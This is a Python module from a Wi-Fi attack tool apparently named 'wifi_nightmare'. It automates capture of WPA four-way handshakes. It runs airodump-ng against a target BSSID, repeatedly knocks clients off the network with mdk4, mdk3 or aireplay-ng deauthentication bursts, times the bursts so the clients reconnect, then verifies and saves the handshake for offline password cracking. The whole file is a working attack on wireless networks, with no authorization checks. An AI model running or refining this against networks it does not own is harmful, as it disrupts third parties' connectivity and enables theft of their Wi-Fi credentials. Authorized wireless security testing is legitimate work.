import os
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time
from wifi_nightmare.logger import logger
from wifi_nightmare.config import HANDSHAKES_DIR, C_GREEN, C_RED, C_YELLOW, C_CYAN, C_RESET
from wifi_nightmare.utils import mask_bssid, mask_bssid_filename, safe_ssid as sanitize_ssid


def _find_deauth_tool():
    for tool in ("mdk4", "mdk3", "aireplay-ng"):
        if shutil.which(tool):
            return tool
    return None


def _analyze_capture(cap_file, bssid):
    """Run aircrack-ng on the capture; return (handshake_count, bssid_present, raw_stdout).

    NOTE: deliberately run WITHOUT `-b` — aircrack-ng can suppress the
    "N handshake" count line in `-b` targeted mode, which would make us
    report failure even when a valid handshake is present. The pcap is
    already BSSID-filtered by airodump-ng, so any handshake counted belongs
    to our target.
    """
    try:
        proc = subprocess.run(
            ["aircrack-ng", cap_file],
            capture_output=True, text=True, timeout=10,
            stdin=subprocess.DEVNULL
        )
        out = proc.stdout.lower()
        m = re.search(r'(\d+)\s+handshake', out)
        count = int(m.group(1)) if m else 0
        return count, bssid.lower() in out, proc.stdout
    except Exception as e:
        logger.debug(f"aircrack analyze failed: {e}")
        return 0, False, ""


def _count_eapol_frames(cap_file, bssid):
    """Diagnostic: count EAPOL-Key frames for bssid directly from the pcap."""
    try:
        from scapy.all import rdpcap, EAPOL, Dot11
        pkts = rdpcap(cap_file)
        bssid = bssid.lower()
        count = 0
        for p in pkts:
            if p.haslayer(EAPOL) and getattr(p[EAPOL], 'type', None) == 3:
                d = p[Dot11] if p.haslayer(Dot11) else None
                if d:
                    addrs = {getattr(d, 'addr1', ''), getattr(d, 'addr2', ''), getattr(d, 'addr3', '')}
                    if bssid in addrs:
                        count += 1
        return count
    except Exception:
        return -1


def _verify_handshake(cap_file, bssid):
    """Return True if the capture contains a valid WPA handshake for bssid."""
    count, bssid_found, _raw = _analyze_capture(cap_file, bssid)
    return count >= 1 and bssid_found


def _kill_proc(proc):
    if proc is None or proc.poll() is not None:
        return
    try:
        if os.name != "nt":
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        else:
            proc.terminate()
        proc.wait(timeout=3)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass


def capture_handshake(interface, bssid, channel, timeout=60, ssid="Unknown"):
    if not shutil.which("airodump-ng"):
        logger.error("airodump-ng not found")
        print(f"{C_RED}[!] airodump-ng not found. Install: sudo apt install aircrack-ng{C_RESET}")
        return None

    deauth_tool = _find_deauth_tool()
    if not deauth_tool:
        logger.error("No deauth tool found (mdk4/mdk3/aireplay-ng)")
        print(f"{C_RED}[!] No deauth tool found. Install mdk4: sudo apt install mdk4{C_RESET}")
        return None

    tmpdir = tempfile.mkdtemp(prefix="wfn_")
    cap_prefix = os.path.join(tmpdir, "cap")
    bl_file = os.path.join(tmpdir, "bl.txt")

    print(f"{C_YELLOW}[*] Using: airodump-ng + {deauth_tool}{C_RESET}")
    print(f"{C_YELLOW}[*] Capturing handshake for {mask_bssid(bssid)} on ch{channel} (timeout: {timeout}s){C_RESET}")

    airodump_proc = None
    deauth_proc = None

    try:
        airodump_cmd = [
            "airodump-ng",
            "--write", cap_prefix,
            "--output-format", "pcap",
            "--bssid", bssid,
            "--channel", str(channel),
            interface
        ]
        airodump_proc = subprocess.Popen(
            airodump_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid if os.name != "nt" else None
        )
        logger.info(f"airodump-ng started (PID {airodump_proc.pid})")
        time.sleep(2)

        with open(bl_file, "w") as f:
            f.write(bssid + "\n")

        if deauth_tool in ("mdk4", "mdk3"):
            deauth_cmd = [deauth_tool, interface, "d", "-b", bl_file, "-c", str(channel)]
        else:
            deauth_cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid,
                          "--ignore-negative-one", interface]

        # Deauth strategy: BURST then a LONG quiet wait. A continuous deauth
        # flood (mdk4 'd' mode / aireplay --deauth 0) keeps kicking clients, so
        # they can never finish re-associating and the handshake never completes.
        # Instead: kick the client once (short burst), then stay silent for a
        # long window so it can reconnect AND finish the 4-way handshake without
        # being re-kicked mid-way. Short cycles actually slow slow-reconnecting
        # clients down — they get kicked again right as they're about to
        # reconnect. No blocking prompt: the user may not have physical access
        # to the client, and it may simply be reconnecting on its own.
        BURST_SECONDS = 4    # how long each deauth flood runs
        SILENT_SECONDS = 30  # long quiet window for reconnect + handshake
        deauth_err_file = os.path.join(tmpdir, "deauth_err.txt")

        def _start_burst():
            nonlocal deauth_proc
            deauth_proc = subprocess.Popen(
                deauth_cmd,
                stdout=subprocess.DEVNULL,
                stderr=open(deauth_err_file, "wb"),
                preexec_fn=os.setsid if os.name != "nt" else None
            )
            logger.info(f"{deauth_tool} deauth burst started (PID {deauth_proc.pid})")

        def _stop_burst():
            nonlocal deauth_proc
            _kill_proc(deauth_proc)
            deauth_proc = None

        def _check_deauth_health():
            """If the deauth tool wrote an error, surface it instead of failing silently."""
            try:
                if not os.path.exists(deauth_err_file) or os.path.getsize(deauth_err_file) == 0:
                    return
                with open(deauth_err_file, "r", errors="replace") as f:
                    err = f.read()
                markers = ("no such device", "not found", "operation not permitted",
                           "permission denied", "failed", "cannot", "unsupported",
                           "error", "no card", "invalid", "unable", "disabled")
                low = err.lower()
                if any(m in low for m in markers):
                    tail = err.strip().splitlines()[-3:]
                    print(f"\n{C_RED}[!] {deauth_tool} reported an error:{C_RESET}")
                    for ln in tail:
                        print(f"{C_RED}    {ln.strip()}{C_RESET}")
                    print(f"{C_YELLOW}    Deauth may not be working. Re-plug the adapter or verify "
                          f"injection: aireplay-ng --test {interface}{C_RESET}")
            except Exception:
                pass

        _start_burst()
        burst_start = time.time()
        deauth_active = True
        hint_shown = False
        print(f"{C_GREEN}[+] Deauth burst active ({deauth_tool}), monitoring...{C_RESET}")

        start = time.time()
        while time.time() - start < timeout:
            elapsed = int(time.time() - start)

            # Poll for a completed handshake
            cap_file = f"{cap_prefix}-01.cap"
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
                if _verify_handshake(cap_file, bssid):
                    print(f"\n{C_GREEN}[+] HANDSHAKE CAPTURED! ({elapsed}s){C_RESET}")

                    safe_ssid = sanitize_ssid(ssid)
                    final_name = f"{safe_ssid}_{mask_bssid_filename(bssid)}.pcap"
                    final_path = os.path.join(HANDSHAKES_DIR, final_name)
                    shutil.copy2(cap_file, final_path)
                    print(f"{C_GREEN}    Saved: {final_path}{C_RESET}")
                    logger.info(f"Handshake captured: {final_path}")
                    return final_path

            # airodump-ng died mid-capture — don't waste the remaining timeout
            if airodump_proc.poll() is not None:
                logger.error(f"airodump-ng exited early (code {airodump_proc.returncode})")
                print(f"\n{C_RED}[!] airodump-ng exited early ({airodump_proc.returncode}) — check interface state{C_RESET}")
                break

            # Toggle deauth: burst for BURST_SECONDS, then a LONG silence so the
            # client can reconnect and finish the handshake without being kicked
            # mid-way. The 1s poll above catches the handshake the moment it
            # completes.
            now = time.time()
            if deauth_active and now - burst_start >= BURST_SECONDS:
                _stop_burst()
                _check_deauth_health()
                deauth_active = False
                burst_start = now
                logger.info("Deauth burst complete, waiting for client reconnect...")
                print(f"\n{C_YELLOW}    Deauth burst done, waiting for reconnect...{C_RESET}")
            elif not deauth_active and now - burst_start >= SILENT_SECONDS:
                # Silence ended without a verified handshake. Explain once, then
                # kick again and wait. The client may simply be reconnecting
                # slowly on its own, and the user may not have physical access
                # to it — so no blocking prompt, just an honest status note.
                if not hint_shown:
                    hint_shown = True
                    eapol = 0
                    if os.path.exists(cap_file):
                        eapol = _count_eapol_frames(cap_file, bssid)
                    if eapol == 0:
                        print(f"\n{C_YELLOW}    No handshake yet — the client may still be "
                              f"reconnecting on its own.{C_RESET}")
                        print(f"{C_YELLOW}    If you have access to it, toggling its Wi-Fi "
                              f"off/on now speeds this up.{C_RESET}")
                    else:
                        print(f"\n{C_YELLOW}    {eapol} EAPOL frames but no verified handshake — "
                              f"re-kicking for a fresh one.{C_RESET}")
                _start_burst()
                deauth_active = True
                burst_start = now
                logger.info("Starting next deauth burst...")
                print(f"\n{C_YELLOW}    Sending next deauth burst...{C_RESET}")

            phase = "Deauthing" if deauth_active else "Waiting for client reconnect"
            pcap_note = ""
            if os.path.exists(cap_file):
                sz = os.path.getsize(cap_file)
                pcap_note = f" | pcap: {sz/1024:.1f} KB" if sz > 1024 else f" | pcap: {sz} B"
            sys.stdout.write(f"\r\033[K{C_CYAN}    [{elapsed}s/{timeout}s] {phase}...{pcap_note}{C_RESET}")
            sys.stdout.flush()
            time.sleep(1)

        print(f"\n{C_RED}[-] Handshake not captured within {timeout}s{C_RESET}")
        if os.path.exists(cap_file):
            size = os.path.getsize(cap_file)
            count, bssid_found, _raw = _analyze_capture(cap_file, bssid)
            eapol = _count_eapol_frames(cap_file, bssid)
            print(f"{C_YELLOW}    Capture diagnostics:{C_RESET}")
            print(f"      pcap size       : {size} bytes")
            print(f"      EAPOL-Key frames: {eapol if eapol >= 0 else 'n/a (scapy read failed)'}")
            print(f"      aircrack-ng says: {count} handshake, target BSSID "
                  f"{'present' if bssid_found else 'not found'}")
            if eapol == 0:
                print(f"{C_YELLOW}      No EAPOL frames — the client isn't reconnecting. "
                      f"Toggle its Wi-Fi during the wait window.{C_RESET}")
            elif count == 0:
                print(f"{C_YELLOW}      EAPOL frames present but aircrack-ng counts 0 — "
                      f"handshake incomplete, keep the client connected longer.{C_RESET}")
        return None

    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[*] Capture interrupted{C_RESET}")
        return None
    except Exception as e:
        logger.error(f"Native capture error: {e}")
        print(f"{C_RED}[!] Capture error: {e}{C_RESET}")
        return None
    finally:
        _kill_proc(deauth_proc)
        _kill_proc(airodump_proc)
        try:
            shutil.rmtree(tmpdir, ignore_errors=True)
        except Exception:
            pass
